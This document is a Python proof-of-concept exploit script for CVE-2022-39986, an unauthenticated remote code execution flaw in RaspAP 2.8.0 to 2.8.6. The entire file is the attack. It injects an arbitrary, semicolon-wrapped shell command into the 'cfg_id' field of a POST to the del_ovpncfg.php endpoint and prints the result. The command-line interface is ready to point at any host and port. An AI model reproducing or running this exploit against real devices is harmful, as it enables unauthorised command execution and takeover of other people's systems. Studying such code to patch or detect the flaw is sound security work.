# Title: Unauth Remote Code Execution for RaspAP
# Vulnerable Versions: 2.8.0>2.8.6
# CVE: CVE-2022â€“39986

import sys
import argparse
import requests

class ExploitCVE:
    def __init__(self, tgt_host, tgt_port, cmd):
        self.tgt_host = tgt_host
        self.tgt_port = tgt_port
        self.cmd = ";" + cmd + ";"
        self.endpoint = "ajax/openvpn/del_ovpncfg.php"
        self.url = f"http://{self.tgt_host}:{self.tgt_port}/{self.endpoint}"
        self.session = requests.Session()

    def execute_exploit(self):
        data_to_post = {"cfg_id": self.cmd}
        response = self.session.post(self.url, data=data_to_post)

        if response.status_code == 200:
            print("[*] Sending command ... ")
            print(response.text)
            print("Done")
        else:
            print(f"Error: [{response.text}]")

def main():
    parser = argparse.ArgumentParser(description="PoC for CVE-2022-39986")
    parser.add_argument("target_host", help="Target host")
    parser.add_argument("target_port", help="Target port")
    parser.add_argument("command", help="intended Command")

    args = parser.parse_args()
    
    exploit_instance = ExploitCVE(args.target_host, args.target_port, args.command)
    exploit_instance.execute_exploit()

if __name__ == "__main__":
    main()
